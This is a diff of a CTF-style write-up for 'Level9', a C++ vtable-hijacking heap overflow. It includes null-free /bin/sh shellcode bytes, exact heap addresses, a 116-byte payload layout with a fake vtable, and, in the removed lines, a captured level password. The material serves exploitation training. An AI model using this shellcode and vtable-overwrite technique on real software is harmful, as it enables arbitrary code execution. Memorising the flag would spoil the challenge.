@@ -1,4 +1,4 @@
-# 🎯 Level9 - C++ Vtable Hijacking with Null-Byte Constraints
+# 🎯 Level9 - C++ Vtable Hijacking
 
 ![Helldivers C++ Warfare](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExbWpoMWQ4cjQ0ZWU0M2hraHpsenloM2E4eTN4Y3hpaTIwZHgybmVpZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/rTAVMVAps9zsFINvxI/giphy.gif)
 
@@ -6,18 +6,18 @@ Object-oriented exploitation - hijack virtual function tables! 🔥
 
 ## 📋 Binary Analysis
 
-### 🎯 Class N Structure
+### Class N Structure
 
 ```cpp
 class N {
 public:
-    // Memory layout (108 bytes total):
-    // Offset 0x00: vtable pointer (4 bytes) - set by compiler
-    // Offset 0x04: annotation buffer (100 bytes)
-    // Offset 0x68: int value (4 bytes)
+    // Memory layout (108 bytes):
+    // +0x00: vtable pointer (4 bytes)
+    // +0x04: annotation buffer (100 bytes)
+    // +0x68: int value (4 bytes)
     
-    char annotation[100];  // Buffer at offset +4 (after vtable pointer)
-    int value;             // Integer value at offset +104
+    char annotation[100];
+    int value;
     
     N(int n);
     void setAnnotation(char *str);
@@ -26,227 +26,138 @@ public:
 };
 ```
 
-### 🎯 Key Methods
+### Vulnerable Method
 
-**Constructor:**
-```cpp
-N::N(int n)
-{
-    value = n;  // Vtable pointer automatically set to 0x08048848
-}
-```
-
-**setAnnotation (VULNERABLE!):**
 ```cpp
 void N::setAnnotation(char *str)
 {
-    memcpy(annotation, str, strlen(str));  // ⚠️ No bounds checking - overflow!
+    memcpy(annotation, str, strlen(str));  // ⚠️ No bounds checking!
 }
 ```
 
-**Virtual Functions:**
-```cpp
-int N::operator+(N &other)
-{
-    return value + other.value;
-}
+### Main Function
 
-int N::operator-(N &other)
-{
-    return value - other.value;
-}
-```
-
-**Main Function:**
 ```cpp
 int main(int argc, char **argv)
 {
-    if (argc < 2) {
-        _exit(1);
-    }
+    N *obj1 = new N(5);  // heap: ~0x804a008
+    N *obj2 = new N(6);  // heap: ~0x804a078
     
-    N *obj1 = new N(5);  // Allocated on heap at ~0x804a008
-    N *obj2 = new N(6);  // Allocated on heap at ~0x804a078 (108 bytes after)
-    
-    obj1->setAnnotation(argv[1]);  // ⚠️ Overflow can reach obj2's vtable!
-    
-    obj2->operator+(*obj1);  // ⚠️ Calls via vtable - uses corrupted pointer!
+    obj1->setAnnotation(argv[1]);  // ⚠️ Overflow can reach obj2!
+    obj2->operator+(*obj1);        // ⚠️ Virtual call uses corrupted vtable!
     
     return 0;
 }
 ```
 
-### 🔑 Key Addresses
+## 🚨 The Vulnerability
 
-| Element | Address | Notes |
-|---------|---------|-------|
-| **Vtable for N** | `0x08048848` | Original function pointer table |
-| **N::operator+** | `0x0804873a` | Virtual function (what we hijack) |
+**Buffer overflow + vtable hijacking:**
+- `setAnnotation()` copies without bounds check
+- obj1's annotation buffer (100 bytes) can overflow into obj2
+- obj2's vtable pointer (first 4 bytes of object) gets overwritten
+- Virtual function call uses corrupted vtable → arbitrary code execution
 
-**Addresses used in exploit payload:**
-- `\x0c\xa0\x04\x08` → `0x0804a00c` (shellcode location)
-- `\x7c\xa0\x04\x08` → `0x0804a07c` (fake vtable location)
+**Constraint:** `strlen()` stops at null bytes, so all addresses must be null-free.
 
-**Key Observations:**
-- C++ program with virtual functions (vtable-based dispatch)
-- Two objects allocated consecutively on heap
-- `setAnnotation()` has no bounds checking
-- Virtual function called through obj2's vtable after overflow
-- `strlen()` limitation: stops at null bytes
+## 🎯 Address Discovery
 
-## 🚨 The Challenge
-
-This is the first **C++ object-oriented exploitation** challenge, introducing **vtable hijacking**.
-
-**The Setup:**
-```cpp
-obj1 = new N(5);              // 108 bytes at 0x804a008
-obj2 = new N(6);              // 108 bytes at 0x804a078 (112 bytes later)
-obj1->setAnnotation(argv[1]); // Overflow from obj1 into obj2!
-(*obj2) + (*obj1);            // Call virtual function through obj2's vtable
-```
-
-**The Vulnerability:**
-```cpp
-__n = strlen(param_1);                  // Gets length (stops at \x00)
-memcpy((char *)this + 4, param_1, __n); // Copies without bounds check
-```
-
-**The Problem:**
-- Annotation buffer is only 100 bytes (at offset 4)
-- obj2 is 108 bytes away from obj1's annotation buffer
-- If argv[1] is longer than 108 bytes → **overflows into obj2!**
-- Can overwrite obj2's vtable pointer at the start of obj2
-
-**The Goal:**
-Overflow obj1's annotation buffer to overwrite obj2's vtable pointer, redirecting the virtual function call to execute our shellcode.
-
-**The Challenge:**
-`strlen()` stops at null bytes, so we need:
-1. Shellcode without null bytes
-2. Addresses without null bytes in our payload
-
-## 🎯 How the Exploit Works
-
-### Understanding C++ Virtual Functions
-
-**What is a Vtable?**
-
-In C++, classes with virtual functions use a **Virtual Function Table (vtable)**:
-- A table of function pointers stored in the binary
-- Each object contains a pointer to this vtable (first 4 bytes)
-- Virtual function calls are indirect: `object->vtable[index]()`
-
-**Normal Execution:**
-```
-obj2->operator+(obj1):
-  1. Load obj2's vtable pointer (at obj2 + 0)
-  2. Read first entry: vtable[0] = 0x0804873a (operator+)
-  3. Call the function: operator+(obj2, obj1)
-  4. Returns: 6 + 5 = 11
-```
-
-**Vtable Structure:**
-```
-Vtable for N at 0x08048848:
-┌──────────────────────────┐
-│ 0x08048848: 0x0804873a   │ → N::operator+
-│ 0x0804884c: 0x0804874e   │ → N::operator-
-└──────────────────────────┘
-```
-
-### Class N Memory Layout
-
-```
-Class N Object (108 bytes):
-┌─────────────────────────────────────────────────┐
-│ Offset 0x00: [vtable pointer]         (4 bytes) │
-│ Offset 0x04: [annotation buffer]   (100 bytes)  │
-│ Offset 0x68: [int value]              (4 bytes) │
-└─────────────────────────────────────────────────┘
-Total: 0x6c (108 bytes)
-```
-
-### Heap Layout Discovery
-
-Using `ltrace` to see allocations:
+### Step 1: Run ltrace
 
 ```bash
 $ ltrace ./level9 AAAA
-
-_Znwj(108, ...)  = 0x804a008  ← obj1 allocated
-_Znwj(108, ...)  = 0x804a078  ← obj2 allocated (112 bytes later)
-strlen("AAAA")   = 4
-memcpy(0x0804a00c, "AAAA", 4)
+_Znwj(108, ...)  = 0x804a008  ← obj1
+_Znwj(108, ...)  = 0x804a078  ← obj2
 ```
 
-**Distance calculation:**
-```
-obj1:                   0x804a008
-obj1 annotation buffer: 0x804a00c (obj1 + 4)
-obj2:                   0x804a078
-obj2 vtable pointer:    0x804a078 (obj2 + 0)
-
-Distance: 0x804a078 - 0x804a00c = 0x6c = 108 bytes
-```
-
-### Visual: Heap Memory Layout
+### Step 2: Calculate addresses
 
 ```
-AFTER ALLOCATION:
-═══════════════════════════════════════════════════════════════════
-0x804a008: ┌──────────────────────────────────────────────────┐
-           │ obj1 (108 bytes)                                 │
-           ├──────────────────────────────────────────────────┤
-           │ [0x08048848] ← vtable pointer                    │
-0x804a00c: │ [annotation buffer - 100 bytes]                  │ ← setAnnotation writes here
-           │                                                  │
-           │                                                  │
-0x804a070: │ [int value = 5]                                  │
-           └──────────────────────────────────────────────────┘
+obj1 base:              0x804a008
+obj1 annotation buffer: 0x804a00c (obj1 + 4) ← shellcode here
+obj2 base:              0x804a078
+obj2 vtable pointer:    0x804a078 (obj2 + 0) ← overwrite target
+obj2 annotation buffer: 0x804a07c (obj2 + 4) ← use as fake vtable
 
-0x804a074: [4 bytes heap metadata]
-
-0x804a078: ┌──────────────────────────────────────────────────┐
-           │ obj2 (108 bytes)                        ← TARGET!│
-           ├──────────────────────────────────────────────────┤
-           │ [0x08048848] ← vtable pointer WE WANT TO OVERWRITE
-0x804a07c: │ [annotation buffer - 100 bytes]                  │
-           │                                                  │
-0x804a0e0: │ [int value = 6]                                  │
-           └──────────────────────────────────────────────────┘
-
-
-AFTER OVERFLOW:
-═══════════════════════════════════════════════════════════════════
-0x804a00c: [24-byte shellcode][84 bytes padding...]
-           ↑
-           └─ Shellcode at START (bytes 0-23)
-           
-           │ (108 bytes of controlled data)
-           │
-0x804a078: [0x0804a07c] ← Overwritten! Now points to fake vtable
-0x804a07c: [0x0804a00c] ← Fake vtable entry pointing to shellcode start
-
-When operator+ is called:
-  obj2->vtable = 0x0804a07c
-  obj2->vtable[0] = 0x0804a00c ← Points directly to shellcode!
-  Jump to 0x0804a00c → SHELLCODE executes immediately! 🎉
+Distance: 0x804a078 - 0x804a00c = 108 bytes
 ```
 
-### The Null Byte Problem
+### Binary addresses (from Ghidra)
 
-**Challenge:** `strlen()` stops at null bytes, but:
-- Most function addresses contain `\x00` (e.g., `0xb7da8060`)
-- Traditional shellcode contains null bytes
-- We need everything to be null-free!
+- Original vtable: `0x08048848`
+- N::operator+: `0x0804873a`
 
-**Solution:**
-1. Use **null-byte-free shellcode**
-2. Choose addresses **within our payload** that don't have null bytes
-3. Place shellcode at the start, use padding to reach the correct offset
+### Final payload addresses
 
-### Null-Free Shellcode
+| Address | Encoding | Purpose |
+|---------|----------|---------|
+| `0x0804a00c` | `\x0c\xa0\x04\x08` | Shellcode location (obj1 annotation buffer) |
+| `0x0804a07c` | `\x7c\xa0\x04\x08` | Fake vtable location (obj2 annotation buffer) |
+
+Both are null-free! ✅
+
+## 🔧 The Exploit Strategy
+
+### C++ Virtual Call Mechanism
+
+**Normal call:** `obj->method()` compiles to:
+```asm
+mov edx, [obj]      ; Load vtable pointer from object
+mov edx, [edx]      ; Load function pointer from vtable
+call edx            ; Call function
+```
+
+**Two indirections:** object → vtable → function
+
+**Our exploit:** Overwrite obj2's vtable pointer to point to our controlled data (obj2's own annotation buffer), which contains our shellcode address.
+
+### Memory Layout
+
+**Before overflow:**
+```
+0x804a00c: obj1 annotation (100 bytes)
+           └─ overflow 108 bytes ─┐
+0x804a078: obj2 vtable → 0x08048848
+0x804a07c: obj2 annotation
+```
+
+**After overflow:**
+```
+0x804a00c: [shellcode][padding..........]
+           └───────── 108 bytes ─────────┘
+0x804a078: [0x0804a07c] ← corrupted vtable pointer
+0x804a07c: [0x0804a00c] ← fake vtable[0] = shellcode address
+```
+
+**Exploit flow:**
+1. Write 116 bytes to obj1 annotation buffer
+2. Bytes 108-111 overwrite obj2's vtable → point to `0x0804a07c`
+3. Bytes 112-115 write to `0x0804a07c` → place shellcode address `0x0804a00c`
+4. Call `obj2->operator+()` → reads corrupted vtable → jumps to shellcode
+
+### Payload Structure
+
+```
+[24-byte shellcode] + [84-byte padding] + [fake_vtable_ptr] + [shellcode_addr]
+        ↓                    ↓                  ↓                   ↓
+    0x804a00c           fills space        0x804a07c           0x804a00c
+    (bytes 0-23)      (bytes 24-107)    (bytes 108-111)     (bytes 112-115)
+```
+
+| Bytes | Content | Purpose |
+|-------|---------|---------|
+| 0-23 | Shellcode (24 bytes) | Executes `/bin/sh` |
+| 24-107 | Padding (`\x90` * 84) | Fill space to reach offset 108 |
+| 108-111 | `\x7c\xa0\x04\x08` | Fake vtable pointer → obj2's annotation buffer |
+| 112-115 | `\x0c\xa0\x04\x08` | Shellcode address → obj1's annotation buffer |
+
+**Why we need 2 addresses (fake vtable):**
+- Virtual calls use double indirection: `obj → vtable → function`
+- Can't point vtable directly to shellcode (CPU would read FROM shellcode bytes)
+- Must point vtable to controlled memory containing the shellcode address
+- Clever: we use obj2's own annotation buffer as the fake vtable
+
+### Shellcode
 
 We use the same null-byte-free shellcode from **level2** (24 bytes):
 
@@ -254,189 +165,9 @@ We use the same null-byte-free shellcode from **level2** (24 bytes):
 \x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
 ```
 
-**Properties:**
-- ✅ No null bytes
-- ✅ Executes `/bin/sh`
-- ✅ Only 24 bytes long
-
-> 💡 For detailed shellcode analysis and assembly breakdown, see [level2 documentation](../../level2/Ressources/README.md#the-shellcode).
+> 💡 For detailed assembly breakdown, see [level2 documentation](../../level2/Ressources/README.md#the-shellcode).
 >
 > **Source:** [Exploit-DB #42428](https://www.exploit-db.com/shellcodes/42428) by Touhid M.Shaikh
-
-### The Attack Strategy
-
-**Payload Structure:**
-```
-[24-byte shellcode] + [84 bytes padding] + [fake_vtable_ptr] + [shellcode_addr]
-        ↑                    ↑                    ↑                   ↑
-      0-23                24-107               108-111            112-115
-```
-
-**Detailed Breakdown:**
-
-1. **Bytes 0-23 (24 bytes):** Null-free shellcode
-   - Placed at start: `0x804a00c`
-   - Executes `/bin/sh` immediately
-
-2. **Bytes 24-107 (84 bytes):** Padding (`\x90` * 84)
-   - Fills space to reach obj2's vtable at offset 108
-
-3. **Bytes 108-111 (4 bytes):** Fake vtable pointer = `\x7c\xa0\x04\x08`
-   - Overwrites obj2's vtable pointer
-   - Points to `0x804a07c` (our fake vtable location)
-   - No null bytes! ✅
-
-4. **Bytes 112-115 (4 bytes):** Shellcode address = `\x0c\xa0\x04\x08`
-   - This becomes our fake vtable entry
-   - Points to `0x804a00c` (start of payload - where shellcode is!)
-   - No null bytes! ✅
-
-### Address Selection
-
-**From ltrace, we discover:**
-```bash
-$ ltrace ./level9 AAAA
-_Znwj(108, ...)  = 0x804a008  ← obj1 allocated
-_Znwj(108, ...)  = 0x804a078  ← obj2 allocated
-```
-
-**Calculate addresses:**
-```
-obj1 base:              0x804a008
-obj1 annotation buffer: 0x804a00c (obj1 + 4) ← Shellcode goes here
-
-obj2 base:              0x804a078
-obj2 vtable pointer:    0x804a078 (obj2 + 0) ← Overwrite target
-obj2 annotation buffer: 0x804a07c (obj2 + 4) ← Use as fake vtable!
-```
-
-**Why `0x804a07c` as fake vtable?**
-- Bytes 108-111 overwrite obj2's vtable pointer (at `0x804a078`)
-- Bytes 112-115 overflow into obj2's annotation buffer (at `0x804a07c`)
-- We point the vtable to `0x804a07c`, then place our shellcode address there
-- Clever: we're using obj2's own memory space as the fake vtable!
-
-**Addresses used in payload:**
-
-| Address | Little-endian | Purpose |
-|---------|---------------|---------|
-| `0x0804a00c` | `\x0c\xa0\x04\x08` | Shellcode location (obj1 annotation buffer) |
-| `0x0804a07c` | `\x7c\xa0\x04\x08` | Fake vtable location (obj2 annotation buffer) |
-
-Both addresses are null-free! ✅
-
-### Complete Execution Flow
-
-```
-Step 1: Program Start
-─────────────────────
-./level9 [PAYLOAD]
-argv[1] = 116 bytes (shellcode + padding + addresses)
-
-
-Step 2: Object Allocation
-─────────────────────────
-obj1 = new N(5);
-  malloc(108) = 0x804a008
-  vtable = 0x08048848
-  value = 5
-
-obj2 = new N(6);
-  malloc(108) = 0x804a078
-  vtable = 0x08048848
-  value = 6
-
-
-Step 3: setAnnotation Call - THE OVERFLOW
-──────────────────────────────────────────
-obj1->setAnnotation(argv[1]);
-
-__n = strlen(argv[1]);
-  Calculates length (stops at first null, but our payload has none)
-  __n = 116 bytes
-
-memcpy(0x804a00c, argv[1], 116);
-  Destination: obj1 + 4 = 0x804a00c
-  Source: argv[1] = [shellcode + padding + addresses]
-  Length: 116 bytes
-  
-  Writes:
-    0x804a00c-0x804a023: Shellcode (24 bytes)
-    0x804a024-0x804a077: Padding (84 bytes)
-    0x804a078-0x804a07b: \x7c\xa0\x04\x08 ← OVERWRITES obj2->vtable!
-    0x804a07c-0x804a07f: \x0c\xa0\x04\x08 ← Creates fake vtable entry
-
-Result: obj2->vtable = 0x0804a07c (our fake vtable!)
-
-
-Step 4: Virtual Function Call - HIJACKED!
-──────────────────────────────────────────
-(*obj2) + (*obj1);
-
-Normal behavior would be:
-  Load obj2->vtable → 0x08048848
-  Call vtable[0] → N::operator+
-
-Hijacked behavior:
-  Load obj2->vtable → 0x0804a07c ← Our fake vtable!
-  Call vtable[0] → Read 0x0804a07c
-  Value at 0x0804a07c: 0x0804a00c ← Our shellcode address!
-  Jump to 0x0804a00c
-
-
-Step 5: Shellcode Execution
-────────────────────────────
-CPU jumps to 0x0804a00c:
-  Executes shellcode immediately
-  Executes: execve("/bin//sh", NULL, NULL)
-
-
-Step 6: Shell Spawned! 🎉
-──────────────────────────
-$ cat /home/user/bonus0/.pass
-f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
-```
-
-### Why This Works
-
-| Requirement | Status | Explanation |
-|-------------|--------|-------------|
-| **Heap overflow** | ✅ | No bounds check in setAnnotation |
-| **Sequential allocation** | ✅ | obj1 and obj2 allocated 112 bytes apart |
-| **Vtable overwrite** | ✅ | Overflow reaches obj2's vtable at offset 108 |
-| **Virtual call** | ✅ | operator+ is called through vtable |
-| **Null-free payload** | ✅ | All shellcode and addresses avoid \x00 |
-| **Valid addresses** | ✅ | Point to heap locations within our buffer |
-| **Executable heap** | ✅ | No DEP/NX protection on this system |
-| **Fixed addresses** | ✅ | ASLR disabled, heap addresses predictable |
-
-### Key Insight
-
-**Exploit Evolution - Object-Oriented Exploitation:**
-
-Previous levels exploited procedural code:
-- Buffer overflows → overwrite return addresses
-- Format strings → overwrite GOT entries
-- Heap corruption → overwrite function pointers
-
-Level9 introduces **C++ OOP exploitation**:
-- **Vtable hijacking** - redirecting virtual function calls
-- **Object layout manipulation** - understanding C++ memory model
-- **Null-byte constraints** - working with strlen limitations
-- **Heap feng shui** - precise object placement
-
-**Why C++ exploitation is different:**
-- Objects have **structured layouts** with vtables and members
-- Virtual functions use **indirect calls** through vtables
-- Vtables are **per-class**, but each object has a vtable pointer
-- Overwriting a vtable pointer affects **one object**, not all instances
-- Modern C++ has **RTTI** (type info) that can detect corruption
-
-**Real-world relevance:**
-- Browser exploitation (JavaScript engines, DOM objects)
-- Game engines (UnrealScript, Unity)
-- System services written in C++ (Windows, macOS)
-- Modern mitigations: CFI (Control Flow Integrity), vtable verification
 
 ## 💣 Execute the Exploit
 
@@ -462,32 +193,18 @@ f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 
 **Payload breakdown:**
 ```
-\x31\xc0\x99...\xb0\x0b\xcd\x80    = Null-free shellcode (24 bytes)
-\x90 * 84                           = Padding (84 bytes)
-\x7c\xa0\x04\x08                   = Fake vtable pointer (4 bytes)
-\x0c\xa0\x04\x08                   = Shellcode address (4 bytes)
-Total: 116 bytes
-
-Shellcode source: Exploit-DB #42428 by Touhid M.Shaikh
+Shellcode:          24 bytes
+Padding:            84 bytes
+Fake vtable ptr:     4 bytes → 0x0804a07c
+Shellcode address:   4 bytes → 0x0804a00c
+Total:             116 bytes
 ```
 
 ---
 
 > 💡 **Pro Tip**: When exploiting C++ programs, always check the vtable layout first. Understanding the object model is key to crafting precise exploits!
 
-> ⚠️ **Security Note**: Modern C++ protections against vtable hijacking:
-> - **CFI (Control Flow Integrity)** - Validates vtable pointers before use
-> - **Vtable Verification** - Checks vtable belongs to expected class
-> - **Read-only Vtables** - Places vtables in read-only memory
-> - **Safe Virtual Dispatch** - Uses hardened calling conventions
-> - **ASAN/UBSAN** - Detects memory corruption in development
-> 
-> **Safe C++ practices:**
-> - Use `std::string` instead of C-style strings
-> - Enable all compiler warnings and sanitizers
-> - Use smart pointers to avoid manual memory management
-> - Prefer `std::vector` over raw arrays
-> - Enable modern protections: CFI, SafeStack, shadow call stack
+> ⚠️ **Security Note**: Modern C++ protections include CFI (Control Flow Integrity), vtable verification, and read-only vtables. Safe practices: use `std::string`, enable sanitizers, prefer smart pointers over raw memory management.
 
 ## 🎉 Victory!
 
